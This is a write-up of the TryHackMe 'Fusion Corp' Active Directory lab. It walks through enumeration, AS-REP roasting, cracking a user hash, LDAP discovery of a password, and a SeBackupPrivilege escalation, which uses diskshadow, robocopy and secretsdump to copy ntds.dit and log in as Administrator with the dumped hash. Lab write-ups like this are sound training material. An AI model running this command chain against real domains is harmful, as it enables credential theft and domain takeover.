---
title: TryHackMe Fusion Corp
categories: [TryHackMe]
tags: [windows, Active Directory, ASREProasting, Kerberoasting, SeBackupPrivilege]
media_subpath: /images/tryhackme_fusioncorp
image:
  path: room-image.jpeg
---

Room link: [https://tryhackme.com/room/fusioncorp](https://tryhackme.com/room/fusioncorp)

## Initial Scan

```console
# Nmap 7.95 scan initiated Thu Jul  3 22:12:44 2025 as: /usr/lib/nmap/nmap -sS -sC -sV -T4 -p- -oN nmap.txt 10.10.26.151
Nmap scan report for 10.10.26.151
Host is up (0.036s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: eBusiness Bootstrap Template
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-03 21:15:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   DNS_Tree_Name: fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-03T21:16:11+00:00
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2025-07-02T21:07:47
|_Not valid after:  2026-01-01T21:07:47
|_ssl-date: 2025-07-03T21:16:51+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-03T21:16:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## Enumeration

Add `fusion.corp` domain to /etc/hosts

Let's start from smb.

No anonymous listing in smb, and `guest` user is disabled.

![nxc-initial](nxc-initial.png)


Potential users were foudn on website (port 80)

```console
Jhon Mickel
Andrew Arnold
Lellien Linda
Jhon Powel
```

![website-team](website-team.png)


Wanted to run `kerbrute` gobuster found interesting directory (backup)

![gobuster](gobuster.png)


![website-backup](website-backup.png)


Got more users! Now we run kerbrute against them

![backup-users](backup-users.png)


![vim-usernames](vim-usernames.png)


Kerbrute returned 1 valid username

![kerbrute](kerbrute.png)

## Initial entry

Run `impacket-GetNPUsers` to test for ASREProasting

```console
impacket-GetNPUsers fusion.corp/ -dc-ip $ip -usersfile kerbrute_valid_users.txt -outputfile hashes.txt
```

It returned hash, use john or hashcat to crack it

![asrepoasting](asreproasting.png)


![john-lparker](john-lparker.png)


Logging in to rpcclient as lparker discovered 1 more user

![rpcclient-enumdomusers](rpcclient-enumdomusers.png)


![rpcclient-getdompwinfo](rpcclient-getdompwinfo.png)


Firstly ran `crakmapexec smb` to get jmurphy's password but then decided to enumerate `ldap` using netexec. And there's password for `jmurphy` user!

```console
netexec ldap $ip -u 'lparker' -p '[REDACTED]' --users
```

![netexec-ldap](netexec-ldap.png)


Before proceeding let's login as lparker to grab flag

### lparker flag

![lparker-flag](lparker-flag.png)


## Privilege Escalation

Copy `SharpHound.ps1` to the directory where you logged in using evil-winrm and upload it to target. On kali it can be found here:

`/usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1`

```console
upload SharpHound.ps1 </path/to/if-needed>
```

Then in evil-winrm run following (it may take a bit of time):

```console
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\lparker\Desktop -Outputprefix “audit”
```
When it finished - download created file

```console
download <audit.....>
```

Start bloodhound and upload downloaded zip file

jmurphy's group

![bloodhound-jmurphy-group](bloodhound-jmurphy-group.png)

Let's now log in to winrm as jmurphy

### jmurphy flag

(You can grab flag from evil-winrm shell)

![smb-jmurphy-flag](smb-jmurphy-flag.png)


![winrm-jmurphy-flag](winrm-jmurphy-flag.png)

We can try method that includes diskshadow and robocopy.

![whoamipriv-jmurphy](whoamipriv-jmurphy.png)


**On your attacker machine**
 - Create file diskshadow.txt

```console
set context persistent nowriters
add volume c: alias something
create
expose %something% h:
```

 - Convert `diskshadow.txt` to be compatible with windows system

```console
unix2dos diskshadow.txt
```

**On target machine**

```console
upload diskshadow.txt

diskshadow /s dishkhadow.txt

robocopy /b h:\windows\ntds . ntds.dit

reg save hklm\system C:\Users\jmurphy\AppData\Local\Temp\system

download system

download ntds.dir  
```

(It takes quite a time to download, just wait for it to download)

![upload-diskshadow](upload-diskshadow.png)

After downloading `ntds.dit` and `system` files run impacket-secretsdump

```console
impacket-secretsdump -ntds ./ntds.dit -system ./system LOCAL 
```

For logging in using Pass-The-Hash attack use NT hash (first one is LM hash and second is NT)

Administrator:500:LM:NT::: 

And now use evil-winrm to login as administrator using retrieved hash (`-H` option)

### system flag

![system-flag](system-flag.png)

